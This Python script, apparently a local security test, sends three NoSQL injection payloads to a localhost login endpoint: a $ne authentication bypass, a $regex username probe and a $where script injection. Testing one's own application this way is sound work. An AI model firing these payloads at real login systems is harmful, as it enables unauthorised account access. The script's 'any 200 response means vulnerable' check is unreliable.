import requests
import json

# Configuración
TARGET_URL = "http://localhost:3000/login"  # Endpoint de login vulnerable

# Payloads para inyección NoSQL
PAYLOADS = [
    # Bypass de autenticación
    {"username": {"$ne": None}, "password": {"$ne": None}},
    
    # Exfiltración de datos
    {"username": {"$regex": "^admin"}, "password": {"$ne": None}},
    
    # Ataque de script
    {"username": {"$where": "function() { return true; }"}, "password": "x"}
]

def test_nosql_injection(payload):
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(
            TARGET_URL,
            data=json.dumps(payload),
            headers=headers
        )
        
        print(f"\nPayload probado: {json.dumps(payload)}")
        print(f"Status Code: {response.status_code}")
        print(f"Respuesta: {response.text[:200]}...")  # Primeros 200 caracteres
        
        # Verificar si el ataque tuvo éxito
        if "success" in response.text.lower() or response.status_code == 200:
            print("⚠️ Posible vulnerabilidad detectada!")
            
    except Exception as e:
        print(f"Error: {str(e)}")

def main():
    print("Iniciando pruebas de inyección NoSQL...")
    for payload in PAYLOADS:
        test_nosql_injection(payload)

if __name__ == "__main__":
    main()